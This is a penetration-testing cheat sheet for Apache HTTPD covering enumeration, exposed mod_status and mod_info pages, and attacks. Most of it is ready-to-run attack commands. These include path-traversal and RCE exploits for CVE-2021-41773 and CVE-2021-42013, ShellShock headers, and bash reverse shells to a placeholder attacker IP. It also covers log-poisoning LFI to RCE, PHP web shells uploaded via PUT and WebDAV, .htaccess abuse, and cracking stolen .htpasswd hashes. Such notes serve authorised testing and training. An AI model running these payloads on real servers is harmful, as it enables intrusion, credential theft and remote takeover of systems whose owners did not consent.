#Apache #ApacheHTTPD #webserver #webservices #RCE #LFI

## What is Apache HTTPD?
Most widely deployed open-source web server. Highly modular — attack surface varies significantly based on enabled modules (mod_status, mod_cgi, mod_dav, mod_php). Several critical CVEs including unauthenticated path traversal/RCE. Distinct from generic HTTP enumeration — this note covers Apache-specific misconfigs, modules, and vulnerabilities.

- Port: **TCP 80** — HTTP
- Port: **TCP 443** — HTTPS
- Version banner: `Server: Apache/2.4.xx (Ubuntu)`

---

## Key Config Files

| File | Path (Debian/Ubuntu) | Path (RHEL/CentOS) |
|---|---|---|
| Main config | `/etc/apache2/apache2.conf` | `/etc/httpd/conf/httpd.conf` |
| Enabled sites | `/etc/apache2/sites-enabled/` | `/etc/httpd/conf.d/` |
| Enabled mods | `/etc/apache2/mods-enabled/` | — |
| Per-dir config | `.htaccess` (in web root) | `.htaccess` |
| Default web root | `/var/www/html/` | `/var/www/html/` |
| Access log | `/var/log/apache2/access.log` | `/var/log/httpd/access_log` |
| Error log | `/var/log/apache2/error.log` | `/var/log/httpd/error_log` |

---

## Enumeration

```bash
# Version + OS from banner
curl -I http://<target>/ | grep -i "server:"
nmap -p 80,443 --script http-server-header,http-title,banner -sV <target>

# Detect Apache-specific pages
curl -s http://<target>/server-status    # mod_status
curl -s http://<target>/server-info      # mod_info
curl -s http://<target>/manual/          # Apache manual (reveals version)

# Check modules and config via server-info
curl -s http://<target>/server-info | grep -i "module\|config\|directive"

# Find .htaccess files (if directory listing enabled)
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -x .htaccess,.htpasswd,.php,.html,.txt,.bak

# Apache-specific wordlist
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
```

---

## mod_status (/server-status)

Exposes real-time server activity — running requests, client IPs, URLs being processed. Often reveals internal hostnames, backend URLs, and active sessions.

```bash
# Check if exposed (no auth = misconfiguration)
curl -s http://<target>/server-status
curl -s http://<target>/server-status?auto   # machine-readable format

# What it reveals:
# - Client IPs making requests (internal network mapping)
# - URLs currently being processed (may include tokens, credentials in GET params)
# - Worker states, uptime, request counts
# - Virtual host names

# Extract active requests
curl -s http://<target>/server-status | grep -oP 'GET \S+|POST \S+' | sort -u
curl -s http://<target>/server-status?auto | grep -i "request\|client"
```

---

## mod_info (/server-info)

Full module configuration disclosure — reveals loaded modules, config directives, and compiled-in settings.

```bash
curl -s http://<target>/server-info
curl -s http://<target>/server-info | grep -i "module\|LoadModule\|directive\|config file"

# Reveals:
# - All loaded modules (mod_php, mod_cgi, mod_dav, mod_rewrite, etc.)
# - Per-module config directives
# - File paths of config files
# - PHP configuration (if mod_php loaded)
```

---

## Attack Vectors

### CVE-2021-41773 — Path Traversal + RCE (Apache 2.4.49)

Unauthenticated path traversal and RCE on Apache 2.4.49 when `Require all denied` is NOT set on the filesystem.

```bash
# Path traversal — read arbitrary files
curl -s "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -s "http://<target>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"

# RCE (requires mod_cgi enabled)
curl -s -X POST "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  --data "echo Content-Type: text/plain; echo; id"

# Reverse shell via RCE
curl -s -X POST "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash" \
  --data "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"

# Metasploit
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS <target>
set LHOST <attacker_ip>
run
```

### CVE-2021-42013 — Path Traversal (Apache 2.4.50)

Bypass for the 2.4.49 fix — double encoding.

```bash
# Double-encoded traversal
curl -s "http://<target>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"

# RCE
curl -s -X POST "http://<target>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh" \
  --data "echo Content-Type: text/plain; echo; id"

# Metasploit (handles both 41773 and 42013)
use exploit/multi/http/apache_normalize_path_rce
set CVE CVE-2021-42013
run
```

### CVE-2014-6271 — ShellShock (CGI + Bash)

Bash environment variable injection via HTTP headers. Affects Apache with mod_cgi/mod_cgid running CGI scripts that invoke bash.

```bash
# Check for CGI scripts
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt

# Test for ShellShock
curl -H 'User-Agent: () { :; }; echo; echo vulnerable' http://<target>/cgi-bin/test.cgi
curl -H 'Referer: () { :; }; echo; echo vulnerable' http://<target>/cgi-bin/test.sh

# RCE via ShellShock
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' \
  http://<target>/cgi-bin/test.cgi

# Metasploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target>
set TARGETURI /cgi-bin/test.cgi
set LHOST <attacker_ip>
run
```

### Directory Listing (Options +Indexes)

```bash
# Enabled directory listing reveals all files
curl -s http://<target>/uploads/
curl -s http://<target>/backup/
curl -s http://<target>/files/

# Recursively spider exposed directories
wget -r -np --no-parent http://<target>/backup/

# Look for backup files, configs, DB dumps
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt \
  -x zip,tar,gz,bak,sql,old,conf,config
```

### Log Poisoning → LFI to RCE

Inject PHP into Apache access log via User-Agent, then include log via LFI.

```bash
# Step 1: Inject PHP into access log
curl -s -A '<?php system($_GET["cmd"]); ?>' http://<target>/

# Step 2: Include log via LFI
curl -s "http://<target>/vuln.php?file=/var/log/apache2/access.log&cmd=id"

# Log paths to try
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
/proc/self/fd/2    # stderr (sometimes works too)

# Step 3: Escalate to reverse shell
curl "http://<target>/vuln.php?file=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/<port>+0>%261'"
```

### .htaccess Abuse

```bash
# If upload directory allows .htaccess upload:
# Override file handler to execute PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# Upload .htaccess → upload shell.jpg → access shell.jpg → RCE

# .htaccess with php_value — disable security settings
echo 'php_value auto_prepend_file /etc/passwd' > .htaccess

# Disable authentication for a directory
echo 'Satisfy Any' > .htaccess

# Enable CGI execution
echo 'Options +ExecCGI' > .htaccess
echo 'AddHandler cgi-script .txt' >> .htaccess
# Upload shell.txt with CGI content
```

### .htpasswd — Credential Extraction

```bash
# .htpasswd stores HTTP basic auth credentials
curl -s http://<target>/.htpasswd
curl -s http://<target>/.htpasswd.bak

# Common locations
find /var/www -name ".htpasswd" 2>/dev/null
cat /var/www/html/.htpasswd

# Hash format: user:$apr1$... (MD5-APR) or user:{SHA}... (SHA1)
# Crack with hashcat
hashcat -m 1600 hashes.txt /usr/share/wordlists/rockyou.txt   # MD5-APR ($apr1$)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### PHP Extension / MIME Type Bypass

```bash
# If only .php is blocked but other extensions execute PHP:
# Try: .php3, .php4, .php5, .php7, .phtml, .phar, .phps

for ext in php3 php4 php5 php7 phtml phar; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "http://<target>/shell.$ext" -d '<?php system($_GET["cmd"]); ?>')
  echo "$code .${ext}"
done

# Case variation (Windows Apache)
# shell.PHP, shell.Php, shell.PHp

# Null byte (very old PHP versions)
# shell.php%00.jpg
```

### WebDAV (mod_dav)

```bash
# Check WebDAV enabled
curl -X OPTIONS http://<target>/ -v 2>&1 | grep -i "DAV\|Allow:"

# Upload via WebDAV
curl -X PUT http://<target>/shell.php -d '<?php system($_GET["cmd"]); ?>'
curl -X PUT http://<target>/shell.php --data-binary @shell.php

# cadaver WebDAV client
cadaver http://<target>/
dav:> put shell.php
```

---

## Information Disclosure

```bash
# Default test pages (reveal version, OS)
curl -s http://<target>/index.html   # "Apache2 Ubuntu Default Page"
curl -s http://<target>/            # default page may show version

# Backup / temp files
for f in index.php.bak index.php~ .index.php wp-config.php.bak config.php.bak; do
  echo "$(curl -o /dev/null -sw '%{http_code}' http://<target>/$f) $f"
done

# PHP info disclosure
curl http://<target>/phpinfo.php
curl http://<target>/info.php
curl http://<target>/test.php

# Apache error pages — may include path info
curl http://<target>/nonexistent   # 404 may reveal DocumentRoot path
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `Options +Indexes` | Directory listing → file exposure |
| `mod_status` without IP restriction | Internal IP/request disclosure |
| `mod_info` exposed | Full config + module disclosure |
| `mod_cgi` + ShellShock-era bash | RCE via CGI headers |
| Apache 2.4.49/50 unpatched | Unauthenticated path traversal + RCE |
| `.htaccess` override allowed in upload dirs | .htaccess upload → PHP execution |
| `AllowOverride All` in upload directories | .htaccess-based auth bypass / RCE |
| Verbose error pages | Path, config, and version disclosure |
| Log files readable via LFI | Log poisoning → RCE |

---

## Quick Reference

| Goal | Command |
|---|---|
| Version | `curl -I http://host \| grep Server` |
| server-status | `curl -s http://host/server-status` |
| server-info | `curl -s http://host/server-info` |
| CVE-2021-41773 (path traversal) | `curl "http://host/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"` |
| CVE-2021-41773 RCE (MSF) | `exploit/multi/http/apache_normalize_path_rce` |
| ShellShock | `curl -H 'User-Agent: () { :; }; /bin/bash ...' http://host/cgi-bin/x.cgi` |
| Log poison | `curl -A '<?php system($_GET["cmd"]); ?>' http://host/` |
| LFI + log | `?file=/var/log/apache2/access.log&cmd=id` |
| .htpasswd crack | `hashcat -m 1600 hashes.txt rockyou.txt` |
| WebDAV upload | `curl -X PUT http://host/shell.php -d '<?php system($_GET["cmd"]); ?>'` |
